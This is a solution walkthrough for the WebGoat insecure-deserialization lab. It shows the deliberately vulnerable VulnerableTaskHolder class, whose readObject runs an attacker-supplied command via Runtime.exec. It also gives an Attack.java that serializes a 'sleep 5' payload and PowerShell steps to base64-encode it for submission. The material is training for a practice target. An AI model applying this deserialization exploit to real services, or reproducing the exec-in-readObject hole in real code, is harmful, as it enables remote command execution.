---
title: "A8:2021 | Software and Data Integrity | Insecure Deserialization (5) | Cycubix Doc"
layout: default
nav_order: 5
parent: "A8:2021 | Software and Data Integrity | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A8:2021 | Software and Data Integrity | Insecure Deserialization (5) | Cycubix Doc

Let’s try

The following input box receives a serialized object (a string) and it deserializes it.

```
rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
```

Try to change this serialized object in order to delay the page response for exactly 5 seconds.

![](<../../../../.gitbook/assets/Screenshot 2021-01-08 at 14.40.06.png>)

### Solution

* Hints:  WebGoat probably contains the org.dummy.insecure.framework.VulnerableTaskHolder class as shown on the lesson pages. Use this to construct and serialize your attack. The VulnerableTaskHolder might have been updated on the server with the next version number. Not all actions are allowed anymore. The readObject has been changed. For serializing it does not effect the data. Follow the additional hints from the feedback on your attempts.
* In order to create the attack we need to follow this 4  steps: clone the code at the WebGoat repository, compile the necessary classes, run the attack to serialized the object, and convert the token into base64. Let's break down the process: 

a) **Clone the WebGoat repository** to access [the source code](https://github.com/WebGoat/WebGoat/blob/develop/src/it/java/org/owasp/webgoat/DeserializationIntegrationTest.java).

```
git clone https://github.com/WebGoat/WebGoat.git

```

Go into the insecure deserialization java file: 

```
cd WebGoat/webgoat-lessons/insecure-deserialization/src/main/java/org/owasp/webgoat/deserialization
```

This file contains the endpoint used by WebGoat to check your token for completing the lesson.

**b) Compile the necessary classes** (`VulnerableTaskHolder`, `Attack`).

Go into the VulnerableTaskHolder java file. 

```
cd WebGoat/webgoat-lessons/insecure-deserialization/src/main/java/org/dummy/insecure/framework
```

```
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

    private static final long serialVersionUID = 2;

    private String taskName;
    private String taskAction;
    private LocalDateTime requestedExecutionTime;

    public VulnerableTaskHolder(String taskName, String taskAction) {
        super();
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.requestedExecutionTime = LocalDateTime.now();
    }

    @Override
    public String toString() {
        return "VulnerableTaskHolder [taskName=" + taskName + ", taskAction=" + taskAction + ", requestedExecutionTime="
                + requestedExecutionTime + "]";
    }

    private void readObject(ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();

        if (requestedExecutionTime != null &&
                (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10))
                        || requestedExecutionTime.isAfter(LocalDateTime.now()))) {
            throw new IllegalArgumentException("outdated");
        }

        if ((taskAction.startsWith("sleep") || taskAction.startsWith("ping"))
                && taskAction.length() < 22) {
            try {
                Process p = Runtime.getRuntime().exec(taskAction);
                BufferedReader in = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                String line = null;
                while ((line = in.readLine()) != null) {
                    // log.info(line);
                }
            } catch (IOException e) {
                // log.error("IO Exception", e);
            }
        }
    }
}

```

Compile the file

```
javac VulnerableTaskHolder.java
```

Create and compile "Attack.java". 

```
package org.dummy.insecure.framework;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class Attack {
    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("dummy", "sleep 5");
        FileOutputStream fos = new FileOutputStream("serial");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(vulnObj);
        os.close();
    }
}

```

Compile the "Attack.java" file

```
javac Attack.java
```

**c) Run `Attack.java` to Generate the Serialized Object**

```
java org.dummy.insecure.framework.Attack
```

**d) Convert the serialized object to Base64** and submit it to complete the lesson

Running Attack.class creates serial file which needs to be converted to base64 by means of the following command in power shell: 

```
# Read the binary content of the file
$fileContent = Get-Content -Path "serial" -Encoding Byte

# Convert the binary content to a Base64 string
$base64String = [System.Convert]::ToBase64String($fileContent)

# Print the Base64 string
$base64String

```

Copy the Base64 token and submit it in the WebGoat lesson form to complete the exercise.







